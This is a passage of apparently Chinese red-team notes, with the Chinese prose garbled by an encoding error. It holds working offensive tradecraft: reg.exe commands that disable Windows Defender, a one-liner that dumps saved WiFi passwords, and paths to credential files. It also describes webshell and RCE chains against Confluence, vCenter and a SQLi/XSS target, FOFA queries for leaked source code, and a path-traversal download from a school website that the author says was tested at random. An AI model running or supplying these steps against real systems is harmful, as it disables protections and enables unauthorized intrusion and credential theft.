reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SpynetReporting /t REG_DWORD /d 0 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg.exe     delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
```
### æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½/ä¿¡æ¯æ”¶é›† mlocate.db

   mlocate.dbæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œç”¨äºå­˜æ”¾locateå‘½ä»¤çš„ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºå­˜æ”¾äº†æ‰€æœ‰æ–‡ä»¶çš„è·¯å¾„ã€‚

æ–‡ä»¶ä½ç½®
> /var/lib/mlocate/mlocate.db

ä¸ä¹‹å¯¹åº”çš„å‘½ä»¤ â€” locate

åœ¨æ‹¿åˆ°ç›®æ ‡æƒé™ååšä¿¡æ¯æ”¶é›†è¿˜æ˜¯è›®ä¸é”™çš„

```shell
locate web.xml
```
![image](https://user-images.githubusercontent.com/55024146/133720395-fe1a4175-0dc3-4d22-bcf1-ff958bb15a9a.png)

### å†…ç½‘-CMDè·å–WIFIå¯†ç 
â€” by chengmo
```
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 
```
![11111](https://user-images.githubusercontent.com/55024146/134108765-85aa58da-1e62-4ca8-9630-f6d92e600727.png)

### å†…ç½‘-DMZåŒºçªç ´
`æœ¬è´¨ï¼šæ‰¾åˆ°èƒ½é€šå‘å†…ç½‘çš„ä¸»æœº`

- åŒç½‘å¡ä¸»æœº
- å†å²ç™»å½•IPï¼šå¯èƒ½æ¥è‡ªå†…ç½‘çš„è¿ç»´
- ç«™åº“åˆ†ç¦»ï¼šæ•°æ®åº“æœåŠ¡å™¨å¾ˆå¯èƒ½åœ¨å†…ç½‘
  - https://github.com/blackarrowsec/mssqlproxy
- VPNï¼šä¿¡æ¯æ”¶é›†
- é’“é±¼ï¼šé’“é±¼ä¸Šçº¿çš„æœºå­å¤§æ¦‚ç‡æ˜¯åœ¨åŠå…¬ç½‘)

### å†…ç½‘-PowerShellå‘½ä»¤å†å²è®°å½•
`â€” ç±»ä¼¼Linuxä¸‹çš„.bash_history`

æ–‡ä»¶ä½ç½®
>  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

![image](https://user-images.githubusercontent.com/55024146/135838906-ea5e2d1f-5e99-45fc-a841-ca9115c5067c.png)


åˆ©ç”¨æ€è·¯
- æ‰“ç‚¹ï¼š ä»»æ„æ–‡ä»¶ä¸‹è½½+Windowsç³»ç»Ÿï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹è¯¥è·¯å¾„ï¼Œä¹Ÿè®¸æœ‰æ–°ä¸–ç•Œ
- å†…ç½‘ï¼š ä¿¡æ¯æ”¶é›†
- è“é˜Ÿï¼š æº¯æºå–è¯æ—¶ï¼Œæ¯•ç«ŸCMDä¸€ç›´ä»¥æ¥éƒ½è¢«è¯Ÿç—…ï¼ŒPowerShellæ”¹æ”¹é¢œå€¼è¿˜æ˜¯å¾ˆèƒ½æ‰“çš„ï¼Œä½†æ˜¯ä¹Ÿå°±æ‚„æ‚„åœ°ç»™è“é˜Ÿç•™ä¸‹äº†"è¯æ®"(:

![image](https://user-images.githubusercontent.com/55024146/135838819-61bdc4a1-765e-4709-af80-df89dffe5b55.png)

### å†…ç½‘-å®šä½å¤šç½‘å¡ä¸»æœº(OXID Resolver)

å·¥å…·
- https://github.com/Rvn0xsy/OXID-Find/

æ¡ä»¶
- ç›®æ ‡ä¸»æœº: å¼€æ”¾135ç«¯å£

åç»­
- è€ƒè™‘åˆ°å¹³å°å…¼å®¹æ€§ï¼Œå¯ä»¥æ ¹æ®OXID-Findç”¨å…¶ä»–è¯­è¨€é‡æ„ä¸€ç‰ˆè‡ªç”¨ã€‚

### å†…ç½‘-ä¸»æœº"ä¸å‡ºç½‘"
~~æœ¬åœ°ç¯å¢ƒæ­å»ºä¸­~~

### å†…ç½‘-è·¨åŸŸ
~~æœ¬åœ°ç¯å¢ƒæ­å»ºä¸­~~

### æ‰“ç‚¹-Confluence RCEåˆ©ç”¨

è¿‘æœŸçš„1æ¬¡å®æˆ˜

0. Confluence RCE(CVE-2021-26084)ï¼Œå†™å…¥webshellï¼Œè·å–æœåŠ¡å™¨æƒé™
1. æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œè·å–æ•°æ®åº“æƒé™
2. å‰æœŸä¿¡æ¯æ”¶é›†å‘ç°WIKIã€Jiraç­‰ç«™ç‚¹éœ€è¦ADè´¦å·ç™»å½•ï¼ŒçŒœæµ‹å…¶æ•°æ®åº“æœ‰LDAPä¿¡æ¯
3. åœ¨cwd_directory_attributeè¡¨æ‰¾åˆ°LDAPé…ç½®ä¿¡æ¯ï¼Œæ‹¿åˆ°å¯†ç 
4. é€šè¿‡è¯¥å¯†ç è·å–æºç ç®¡ç†å¹³å°(Gitlab)çš„æ§åˆ¶æƒ

### æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-.netç¯å¢ƒ

#### 0x01 å‰è¨€

è¿™æ˜¯å¯¹å­¦æ ¡æŸç½‘ç«™éšæœºæµ‹è¯•å‘ç°çš„ï¼Œå½“æ—¶å¯ä¸‹è½½web.configï¼Œç”±äºä¸ç†Ÿæ‚‰.netå°±æ²¡æœ‰åç»­äº†ã€‚

å‰æ®µæ—¶é—´éš”å£ç­çš„å¤§ä½¬æç¤ºè¯´: å¯ä»¥å°è¯•ä¸‹è½½æºç å®¡è®¡ä¸€æ³¢ğŸ‘€

#### 0x02 æµç¨‹å›é¡¾

åœ¨xxé€šçŸ¥é¡µé¢å‘ç°ä¸€å¤„æ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½ç‚¹
- /tp/DownLoadFile.aspx?filename=

![image](https://user-images.githubusercontent.com/55024146/137951747-c818280c-1fc8-4907-acb6-aaa758197e3d.png)

äºæ˜¯å¼€å§‹çŒœå…¶ç›®å½•
```
?filename=DownLoadFile.aspx
?filename=./DownLoadFile.aspx
?filename=./../DownLoadFile.aspx
......
```
æœ€åä»¥
- ?filename=./../DownLoadFile.aspx

æˆåŠŸä¸‹è½½

![image](https://user-images.githubusercontent.com/55024146/137952301-f2741819-9938-4f84-bff9-f37488f73080.png)

#### 0x03 åˆ©ç”¨æ€è·¯

1.ä¸‹è½½web.configï¼Œè·å–æ•°æ®åº“é…ç½®ä»¥åŠéƒ¨åˆ†ç½‘ç«™æ¶æ„

![image](https://user-images.githubusercontent.com/55024146/137953088-9e11cc43-dfbf-4198-96a3-11f5ddd39bbd.png)

å¦‚å›¾ï¼Œå¯è·å–åˆ°æ•°æ®åº“å¯†ç 

2.éå†ä¸‹è½½*.aspxï¼Œç„¶åæ ¹æ®Inheritsæ‰€å¼•ç”¨æ–‡ä»¶çš„ä½ç½®ï¼Œæ„é€ è·¯å¾„ä¸‹è½½*.dllï¼Œç„¶ådnSpyåç¼–è¯‘åå®¡è®¡å³å¯

ç¤ºä¾‹ï¼šæ–‡ä»¶ä¸‹è½½æ¼æ´

![image](https://user-images.githubusercontent.com/55024146/137953243-159c1f8a-87be-499b-9498-37f6d5acf409.png)



### å†…ç½‘-vSphere & vCenterçš„ååˆ©ç”¨å§¿åŠ¿
â€” å†å²ç¬”è®°æ•´ç†

> å…³äºvcenterçš„åˆ©ç”¨ä¸»è¦æ˜¯åœ¨å·²ç»è·å–æœåŠ¡å™¨æƒé™çš„æƒ…å†µä¸‹

ï¼ˆç™»å½•åå°ï¼‰

- ä» vCenter å¤‡ä»½ä¸­æå– IdP è¯ä¹¦å¹¶ä¼ªé€ ç®¡ç†å‘˜èº«ä»½ç™»å½•åå°ï¼ˆå®æˆ˜æ¡ˆä¾‹ï¼‰
- å·¥å…·åœ°å€
    - [vcenter_saml_login](https://github.com/horizon3ai/vcenter_saml_login)

data.mdbä½ç½®ï¼š

- Linux:
    
    ```
    /storage/db/vmware-vmdir/data.mdb
    ```
    
- Windows
    
    ```
    C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
    ```
    

å®æµ‹æ•ˆæœ

![image](https://user-images.githubusercontent.com/55024146/144646720-bc6bb84a-def4-41e6-8ccc-8aedd89165b8.png)

ç„¶åè®¿é—®https://10.10.10.1/uiï¼Œåœ¨ /ui è·¯å¾„ä¸‹æ›¿æ¢ä¸Šä¸€æ­¥æ‰€è·å¾—çš„cookieå³å¯

![image](https://user-images.githubusercontent.com/55024146/144649479-4b2c2947-5aa2-44bb-b0d5-c7e610799e78.png)


è¿›å…¥åå°å
  - å¯é€šè¿‡vcenterçš„å¿«ç…§åŠŸèƒ½è·å–è™šæ‹Ÿæœºçš„å¿«ç…§ï¼Œç„¶åé€šè¿‡å†…å­˜å–è¯çš„å§¿åŠ¿dumpå‡­è¯ï¼Œpthï¼›
  - ä¹Ÿå¯ä¼ åˆ°æœ¬åœ°ï¼Œå†æ¢å¤æˆè™šæ‹Ÿæœºï¼Œç„¶åé€šè¿‡PEï¼Œé‡å‘½åCMD.EXEä¸ºOSK.exeè¦†ç›–åŸOSK.exeï¼Œæ­¤æ—¶å¼€æœºæ‰“å¼€å±å¹•é”®ç›˜ä¼šå¼¹å‡ºSYSTEMæƒé™çš„å‘½ä»¤è¡Œçª—å£ï¼Œæœ¬åœ°ä¸Šçº¿csç„¶åhashdumpæŠ“å–å‡­è¯ï¼Œpthå³å¯ã€‚ï¼ˆby banliz1ï¼‰

### é’“é±¼-é‚®ç®±æ¢é’ˆ

```
# by se7ensec.cn
å¹³å¸¸å»æ²³è¾¹é’“é±¼ï¼Œè¦ä½¿ç”¨æµ®æ¼‚æ‰ä¼šçŸ¥é“è¿™æ¡æ²³æ˜¯å¦æœ‰é±¼åƒé¥µæ–™ï¼ŒåŒç†å½“é‚®ä»¶æŠ•é€’å‡ºå»åï¼Œæ­¤æ¢é’ˆå¯ä»¥åˆ¤æ–­ç›®æ ‡æ˜¯å¦ç‚¹å‡»äº†é‚®ä»¶ï¼Œä¸è‡³äºé‚£ä¹ˆçš„è‹¦ç­‰ã€‚
```
- [é±¼å‰æ”»å‡»|Mail-Probe é‚®ç®±æ¢é’ˆåå°ç®¡ç†ç³»ç»Ÿ](https://www.se7ensec.cn/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/)

### å†…ç½‘-Citrixçš„åæ¸—é€æ€è·¯
```
Citrixè™šæ‹ŸåŒ–åº”ç”¨å¸¸å¸¸ä¸ADåŸŸç»‘å®šï¼Œå¦‚æœè¢«ç™»å½•ï¼Œå°†ä¼šå¯¹æ•´ä¸ªåŸŸå®‰å…¨é€ æˆéå¸¸é‡å¤§çš„é£é™©ã€‚
```
- [æµ…è°ˆå…³äºä¼ä¸šä¸­citrixçš„æ¸—é€æ€è·¯](https://mp.weixin.qq.com/s/wUv3DIN4woXMZmYOCG2MGg)

### æ‰“ç‚¹-Confluenceååˆ©ç”¨æ€è·¯
- ä¿®æ”¹æ•°æ®åº“ï¼Œå®ç°ç”¨æˆ·ç™»å½•
  - ä¿®æ”¹ç”¨æˆ·ç™»å½•å£ä»¤
  - ä¿®æ”¹Personal Access Tokens(by 3gstudent)
- å†™æ–‡ä»¶
  - Windows: Confluenceé»˜è®¤æƒé™ä¸ºnetwork serviceï¼Œå…·æœ‰å†™æƒé™
  - Linuxï¼š Confluenceé»˜è®¤æƒé™ä¸ºconfluenceï¼Œæ²¡æœ‰å†™æƒé™ï¼Œå¯ä»¥å°è¯•å†…å­˜é©¬

æµ‹è¯•CVE-2021-26084ï¼š
- Windows Server 2016
- Atlassian Confluence 7.4.10
- Postgresql 12.8-1
- AntSword

ç›®å½•ï¼š

![image](https://user-images.githubusercontent.com/55024146/147360211-edf9d0bd-0fd4-47c8-903a-b026dd03d1b0.png)

![image](https://user-images.githubusercontent.com/55024146/147360222-d88ba77b-8893-4c4f-bbf0-345a2cdffaae.png)

- æ•°æ®åº“é…ç½®-confluence.cfg.xml
```
# Windowsé»˜è®¤å®‰è£…
C:\Program Files\Atlassian\Application Data\Confluence\confluence.cfg.xml
# Ubuntué»˜è®¤å®‰è£…
/var/atlassian/application-data/confluence/confluence.cfg.xml
```
![image](https://user-images.githubusercontent.com/55024146/147360359-a2d34a27-8be4-43fa-b1ae-eb21b0bebfe6.png)

### åŸºå»º-å…³äºå­¦ä¹ RFCè§„èŒƒçš„å¿…è¦æ€§

```shell
For better or worse, Requests for Comments (RFCs) are how we specify many protocols on the Internet. 
```

RFCè§„èŒƒå®é™…ä½¿ç”¨åœºæ™¯ç¤ºä¾‹ï¼š
- [ä»RFCè§„èŒƒçœ‹å¦‚ä½•ç»•è¿‡wafä¸Šä¼ è¡¨å• ä¸Šç¯‡](https://www.anquanke.com/post/id/241265)
- [ä»RFCè§„èŒƒçœ‹å¦‚ä½•ç»•è¿‡wafä¸Šä¼ è¡¨å• ä¸‹ç¯‡](https://www.anquanke.com/post/id/242583)
- [åˆ©ç”¨ URN ç»•è¿‡ URL æ£€æŸ¥](https://mp.weixin.qq.com/s/SysCJTcYRpV6dj9QfeQYmQ)
- [åˆ©ç”¨ multipart boundary ç»•è¿‡ WAF](https://mp.weixin.qq.com/s/Wsl17GjucN08YAiwbm0vYQ)
- [An Exploration of JSON Interoperability Vulnerabilities](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
- [é˜…è¯»RFCæ–‡æ¡£çš„ä¸€äº›å°tip](https://articles.zsxq.com/id_ulap24qht285.html)

å­¦ä¹ å‚è€ƒï¼š
- [How to Read an RFC(ä¸­æ–‡è¯‘ç‰ˆ)](https://juejin.cn/post/6844903716051484679)
- [How to Read an RFC](https://www.mnot.net/blog/2018/07/31/read_rfc)

### åŸºå»º-è´Ÿè½½å‡è¡¡åœºæ™¯ä¸‹çš„æ¸—é€
- Why?
> 
> ç›¸ä¿¡èƒ½çœ‹åˆ°è¿™äº›ç¬”è®°çš„å¸ˆå‚…å¯èƒ½éƒ½æ›¾é‡åˆ°è¿‡è´Ÿè½½å‡è¡¡åœºæ™¯ä¸‹çš„æ¸—é€é—®é¢˜ï¼Œæ¯”å¦‚ä½ é€šè¿‡ndayæ‰“ä¸‹äº†ä¸€å°weblogic,å¹¶ä¸Šäº†webshell,å½“ä½ å¯¹ç›®æ ‡æœºå­å†æ¬¡å‘èµ·è¯·æ±‚æ—¶ï¼Œä½ ä¼šå‘ç°æ‰§è¡Œå‘½ä»¤å‡ºé”™ï¼Œä¹Ÿè®¸ä¼šçŒœæµ‹æ˜¯å› ä¸ºç½‘ç»œé—®ã€‹é¢˜ï¼›äºæ˜¯ä½ å†ç”¨expæ‰“äº†ä¸€æ¬¡ï¼ŒæˆåŠŸäº†ï¼Œæ­¤æ—¶çš„ipå¯èƒ½å‘ç”Ÿäº†å˜åŒ–ï¼›å¤±è´¥äº†ï¼Œæ¼æ´ä¸å­˜åœ¨äº†ï¼Ÿåœ¨è¿™äº›é—®é¢˜çš„èƒŒåï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯`è´Ÿè½½å‡è¡¡`åœ¨ä½œç¥Ÿã€‚å†åŠ ä¸Šå¾®æœåŠ¡æ¶æ„å’ŒK8Sçš„å…´èµ·ï¼Œè´Ÿè½½å‡è¡¡çš„åº”ç”¨ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œè¿™æ˜¯ä¸ªä¸å¾—ä¸å­¦ä¹  & è§£å†³çš„å‘ã€‚


- What?

> \# é€šä¿—ç†è§£ï¼š
> ä¸€ä¸ªè¶…å¸‚çš„æ”¶è¥å‘˜é«˜å³°æœŸåªèƒ½æœåŠ¡10ä½é¡¾å®¢ï¼Œå½“åšæ´»åŠ¨æ—¶æœ‰20ä½é¡¾å®¢éœ€è¦æœåŠ¡çš„è¯å¯èƒ½å°±ä¼šæ’é•¿é˜Ÿï¼Œè¿™æ ·è´­ç‰©ä½“éªŒå°†ä¼šå¾ˆå·®(å°±åƒå®¢æˆ·æŠ±æ€¨ç³»ç»Ÿ/ç½‘ç«™è®¿é—®å¤ªæ…¢)ã€‚æœ€ç®€å•çš„åŠæ³•å°±æ˜¯å†æ‹›ä¸ªè¥ä¸šå‘˜ï¼Œé‡æ–°å¼€é€šä¸€ä¸ªå‡ºå£ã€‚è´Ÿè½½å‡è¡¡çš„æ ¸å¿ƒå°±æ˜¯â€œåˆ†æ‘Šå‹åŠ›â€ã€‚


- How?
  - [æ¸—é€æµ‹è¯•-è´Ÿè½½å‡è¡¡è¯†åˆ«](https://blog.csdn.net/Z_Grant/article/details/99636169)
  - [è´Ÿè½½å‡è¡¡è¸©å‘è®°](https://xz.aliyun.com/t/10297)
  - [è´Ÿè½½å‡è¡¡ä¸‹çš„ WebShell è¿æ¥](https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA)
  - [å†…ç½‘æ¸—é€-FRPè´Ÿè½½å‡è¡¡](https://scarletf.github.io/2021/02/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-FRP%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/)
  - [proxyshell é’ˆå¯¹Exchangeè´Ÿè½½å‡è¡¡æƒ…å†µä¸‹çš„ä¿®æ”¹ç‰ˆPOC](https://www.t00ls.cc/articles-64010.html)
  - [Neo-reGeorg-(é php) å·²æ”¯æŒå†…ç½‘è½¬å‘ï¼Œåº”å¯¹è´Ÿè½½å‡è¡¡ç¯å¢ƒ](https://github.com/L-codes/Neo-reGeorg#features)
  - [æŒ–æ´ç»éªŒ | ä»è´Ÿè½½å‡è¡¡æˆ–CDNåº”ç”¨ä¸­å‘ç°çš„é…ç½®ç±»æ¼æ´](https://www.freebuf.com/vuls/227805.html)

### äº‘å®‰å…¨-K8Såœºæ™¯ä¸‹çš„æ¸—é€
- [Kuberneteså®‰å…¨æµ‹è¯•å®è·µå½•](https://tttang.com/archive/1389/)
- [Kubernetes(K8s)æ¨ªå‘ç§»åŠ¨åŠæ³•](https://payloads.online/archivers/2021-07-20/1/)
- [Kuberneteså®‰å…¨å…¥é—¨](https://xz.aliyun.com/t/4276)
- [Kubernetesé›†ç¾¤æ¸—é€æµ‹è¯•](https://www.freebuf.com/vuls/196993.html)
- [K8sæ¸—é€æµ‹è¯•ä¹‹kube-apiserveråˆ©ç”¨](https://www.cdxy.me/?p=839)
- [K0OTKITï¼šHACK K8S IN A K8S WAY](http://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/)
- [åä¸ºäº‘CTF cloudéé¢„æœŸè§£ä¹‹k8sæ¸—é€å®æˆ˜](https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/)
- [å®¹å™¨å®‰å…¨ & å®¹å™¨æ¸—é€å­¦ä¹ ç¬”è®°](https://lfysec.top/2021/07/13/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%20&%20%E5%AE%B9%E5%99%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
- [äº‘åŸç”Ÿå®‰å…¨|åŸºäºå®¹å™¨ATT&CKçŸ©é˜µæ¨¡æ‹Ÿæ”»é˜²å¯¹æŠ—çš„æ€è€ƒ](https://www.secpulse.com/archives/168616.html)
- [å­¦ä¹ K8Sä¸­å¸¸è§çš„21ç§æ”»å‡»æ–¹å¼](https://www.wangan.com/p/7fygf39b3e601183)
- [çº¢è“å¯¹æŠ—ä¸­çš„äº‘åŸç”Ÿæ¼æ´æŒ–æ˜åŠåˆ©ç”¨å®å½•](https://security.tencent.com/index.php/blog/msg/183)

### ä¿¡æ¯æ”¶é›†-FoFaè·å–é—­æºè½¯ä»¶æºç 
> å…¶ä»–æµ‹ç»˜å¼•æ“åŒç†
ç¤ºä¾‹ï¼š
```
body="web.config" && "oa" && "rar" && country="CN"
body="web.config" && "U8" && country="CN"
body="web.config" && "EAS" && country="CN"
body="web.config" && "k3s" && country="CN"
body="web.config" && "kingdee" && country="CN"
body="web.config" && "ç³»ç»Ÿ" && country="CN"
body="web.config" && "åŠå…¬" && country="CN"
body="web.config" && "EKP" && country="CN"
...
```
æ•ˆæœï¼š æŸOAå…¨å®¶æ¡¶ï¼Ÿ

![image](https://user-images.githubusercontent.com/55024146/149176963-7a121285-b4be-4f1c-a039-6ee6d5f71ac7.png)


### æ‰“ç‚¹-æ–‡ä»¶å†™å…¥->RCE çš„è·¯å¾„
- Web
  - Webshell
  - æ–‡ä»¶åŒ…å«(php)
  - æ¨¡æ¿å¼•æ“(.vmã€.ftl)
  - è„šæœ¬æ–‡ä»¶(.groovy)
- Linux
  - è®¡åˆ’ä»»åŠ¡ cron
  - å¼€æœºå¯åŠ¨ç¨‹åº /etc/rc.local
  - SSHå…¬é’¥
- Windows
  - å¯åŠ¨é¡¹
  - MOF(windows 2003)

### å†…ç½‘-Microsoft ATA è§„é¿
> æ²¡é‡åˆ°è¿‡ï¼Œé‡åˆ°äº†ä¹Ÿä¸ä¸€å®šçŸ¥é“è‡ªå·±é‡åˆ°äº†ï¼Œå†ä¸€æ¬¡è¢«è‡ªå·± Vegetable Cried ï¼ï¼ï¼
- 0ã€[What is Advanced Threat Analytics?](https://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata)
- 1ã€[Week of Evading Microsoft ATA @Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/search/label/Advanced%20Threat%20Analytics)
- 2ã€[Microsoft ATA Evasion (Over PTH, Golden Ticket)](https://cyberstruggle.org/microsoft-ata-evasion-overpth-golden-ticket/)
- 3ã€[Evading Microsoft ATA for Active Directory Domination @Black Hat](https://www.youtube.com/watch?v=bHkv63-1GBY)

### æ‰“ç‚¹-SQLi+æ—ç«™XSS->RCE

- ç›®æ ‡ç«™ç‚¹å­˜åœ¨ä¼ªé™æ€æ³¨å…¥
  - sqlmapè·å–åˆ°sql-shell(mysql)
    - ç›´æ¥å†™å…¥shellå¤±è´¥(into outfile/dump)ï¼ŒçŒœæµ‹å‡½æ•°è¢«ç¦ç”¨
    - æ—¥å¿—å†™å…¥shellå¤±è´¥(æ—¥å¿—è·¯å¾„æˆåŠŸä¿®æ”¹)
  - æŸ¥è¯¢åˆ°webç®¡ç†åå°è´¦å·å¯†ç ï¼Œç™»å½•å¤±è´¥ï¼ŒåŸå› æš‚ä¸è¯¦
- æ—ç«™æœç´¢æ¡†å­˜åœ¨ä¸€å¤„XSS
  - ä¸ç›®æ ‡ç«™ç‚¹ä½¿ç”¨åŒä¸€æ•°æ®åº“
  - å­˜åœ¨æœç´¢æ¡†ã€ä¸”ä¸æ•°æ®åº“å­˜åœ¨äº¤äº’
  - XSS -> æ²¡æœ‰è¿‡æ»¤å°–æ‹¬å·<>
    - æ„å‘³ç€å¯ä»¥æ’å…¥phpä¸€å¥è¯
- åˆ©ç”¨æ€è·¯
  - ä¸»ç«™ä¼ªé™æ€æ³¨å…¥è·å–çš„sql-shellæ¥ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®ï¼Œåœ¨æ—ç«™æ’å…¥phpä¸€å¥è¯ï¼Œç”±äºä¸æ•°æ®åº“å­˜åœ¨äº¤äº’ï¼Œäºæ˜¯payloadå°†ä¼šè¢«è®°å½•åˆ°å·²ä¿®æ”¹çš„æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œgetshell

![image](https://user-images.githubusercontent.com/55024146/162492152-b5a4cebb-436d-4519-9f95-fe2595626db3.png)

getshellåï¼Œå¯è§æ—¥å¿—è®°å½•å¦‚ä¸‹ï¼š

![image](https://user-images.githubusercontent.com/55024146/162492410-d22c1ff7-ffa1-4f95-96a9-ecd088432ca8.png)

### æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½/è¯»å–-mysql ibdata1

- by Bughunter

> è¯»å–mysqlçš„ibdata1æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶é‡Œä¼šå­˜æœ‰æ•°æ®åº“å†…å®¹ä¿¡æ¯

ä½¿ç”¨utf-8æ‰“å¼€æ–‡ä»¶ï¼Œä½¿ç”¨æ­£åˆ™æœç´¢
```
admin([a-f\d]{32}|[A-F\d]{32})
```

![image](https://user-images.githubusercontent.com/55024146/162625522-397dc754-6bce-4dde-a850-6fc05582ed17.png)
